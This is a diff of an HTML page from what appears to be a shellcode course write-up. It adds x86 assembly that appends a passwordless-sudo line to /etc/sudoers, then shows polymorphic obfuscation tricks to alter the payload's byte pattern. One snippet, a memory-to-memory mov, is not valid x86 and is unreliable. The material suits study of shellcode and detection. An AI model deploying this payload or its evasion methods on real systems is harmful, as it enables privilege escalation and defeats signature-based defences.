@@ -164,10 +164,139 @@
 										sudo. &nbsp;Basically it adds the [dangerous] line "ALL ALL=(ALL) NOPASSWD: ALL" to the file. &nbsp;If anyone can run
 										<a href="https://www.sudo.ws/intro.html" target="_blank" style="color:blue;">sudo commands</a> without a password, it
 										presents an easy vector for privilege escalation. &nbsp;Original shellcode is found
-										<a href="http://shell-storm.org/shellcode/files/shellcode-62.php" target="_blank" style="color:blue;">here</a>
-										  with a size of 86 bytes.
+										<a href="http://shell-storm.org/shellcode/files/shellcode-62.php" target="_blank" style="color:blue;">here</a> and below
+										 with a size of 86 bytes.
 									</p>
-									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; Linux/x86 - edit /etc/sudoers for full access - 86 bytes by Rick
+;
+; From `http://shell-storm.org/shellcode/files/shellcode-62.php`
+
+section .text
+	global _start
+
+_start:
+
+	; open("/etc/sudoers", O_WRONLY | O_APPEND);
+	xor eax, eax
+	push eax		; push NULL
+	push 0x7372656f		; "sreo"
+	push 0x6475732f		; "dus/"
+	push 0x6374652f		; "cte/"
+	mov ebx, esp		; ebx points to "/etc/sudoers\0"
+	mov cx, 0x401		; ecx = flag values
+	mov al, 0x05		; eax = open() syscall
+	int 0x80		; syscall
+
+	mov ebx, eax		; returned file descriptor moved into ebx for write()
+
+	; write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
+	xor eax, eax
+	push eax		; push NULL
+	push 0x0a4c4c41		; "\nLLA"
+	push 0x203a4457		; " :DW"
+	push 0x53534150		; "SSAP"
+	push 0x4f4e2029		; "ON )"
+	push 0x4c4c4128		; "LLA("
+	push 0x3d4c4c41		; "=LLA"
+	push 0x204c4c41		; " LLA"
+	mov ecx, esp		; ecx points to "ALL ALL=(ALL) NOPASSWD: ALL\n"
+	mov dl, 0x1c		; edx = 28
+	mov al, 0x04		; eax = 4 = syscall write()
+	int 0x80		; syscall
+
+	; close(file)
+	; ebx already = file descriptor
+	mov al, 0x06		; eax = close() syscall
+	int 0x80		; syscall
+
+	; exit(0)
+	xor ebx, ebx		; ebx = 0 exit status
+	mov al, 0x01		; eax = exit() syscall
+	int 0x80		; syscall
+
+										</code>
+									</pre>
+
+									<p>
+										Since this shellcode is relatively safe, it can be compiled and tested with <i>nasm</i> and <i>ld</i>. &nbsp;Dump the contents of <i>/etc/sudoers</i> before
+										running the compiled payload, and again after executing the payload to confirm <code>ALL ALL=(ALL) NOPASSWD: ALL</code> was indeed written to the file!
+										 &nbsp;Ensure this line is removed afterward with the commands <code>sudo su; visudo -f /etc/sudoers</code>.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/7-original-check.png" alt="" /></div></center><br>
+
+									<p>
+										This is a significantly longer payload so some creativity is needed. &nbsp;The <i>write()</i> section contains several DWORDs pushed onto the stack making them strong candidates for
+										modification. &nbsp;The DWORDS form the strings <i>"/etc/sudoers"</i> and <i>"ALL ALL=(ALL) NOPASSWD: ALL\n"</i> in each syscall. &nbsp;A couple of techniques are used to
+										randomize how this information is loaded. &nbsp;For example, the first DWORD push can be changed to two instructions such that the same data appears on the stack. &nbsp;Beware that
+										this modification increases the opcode length from 5 bytes to 12 bytes (7 byte increase)!
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; push 0x7372656f		; "sreo"
+
+  push 0x85a6bbe7		; push random number
+  sub dword [esp], 0x12345678	; perform math on random number
+
+  ; "sreo" now appears on stack!!
+										</code>
+									</pre>
+
+									<p>
+										Another method is loading <i>eax</i> with the random number instead of pushing it onto the stack. &nbsp;Math can be performed on the register before pushing the its value on the
+										 stack. &nbsp;Note that this is still an increase of 6 bytes; however, it can be repeated for each DWORD pushed onto the stack. &nbsp;Below is the example.
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; push 0x0a4c4c41		; "\nLLA"
+
+  mov eax, 0x1f605f53		; push random number
+  sub eax, 0x15141312		; perform math on random number
+
+  ; "\nLLA" now appears on stack!!
+										</code>
+									</pre>
+
+									<p>
+										If enough values are the same, they can be copied from the stack and placed into a byte offset of the stack and adjusted accordingly. &nbsp;This instruction would look like:
+									</p>
+									<pre>
+										<code class="x86asm" style=display:block;white-space:pre-wrap>
+; arbitrary value movement example
+
+  mov dword [esp - 4], [esp]		; move stack value
+  sub esp, 4				; adjust stack pointer
+
+  ; \o/
+										</code>
+									</pre>
+
+									<p>
+										Once enough instructions have been altered, compile the assembly and dump the shellcode contents.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/8-dump-sudoer.png" alt="" /></div></center><br>
+
+									<p>
+										Count the shellcode bytes with a simple python script to determine if length requirements are met. &nbsp;Since the original size is 86 bytes, the final product has a maximum allowable size of
+										129 bytes.
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/9-counter-sudoer.png" alt="" /></div></center>
+									<center><div class="image post"><img src="../images/slae/assignment6/10-sudoer-count.png" alt="" /></div></center><br>
+
+									<p>
+										Copy and paste the shellcode into the C-code harness
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/11-sudoer-harness.png" alt="" /></div></center><br>
+
+
+									<p>
+										The &nbsp;Below is the output!
+									</p>
+									<center><div class="image post"><img src="../images/slae/assignment6/sudoers-harness.gif" alt="" /></div></center><br>
+
+
+
 
 
 
@@ -196,7 +325,7 @@ main:
 	mov byte [esi+17],al		; '#' replaced with 0
 	mov long [esi+18],esi		; esi = '/sbin/iptables0-F0/sbin/iptables0-F0'
 	lea ebx,[esi+15]				; ebx points to '-F0/sbin/iptables0-F0'
-	mov long [esi+22],ebx
+	mov long [esi+22],ebx		;
 	mov long [esi+26],eax
 	mov al,0x0b
 	mov ebx,esi
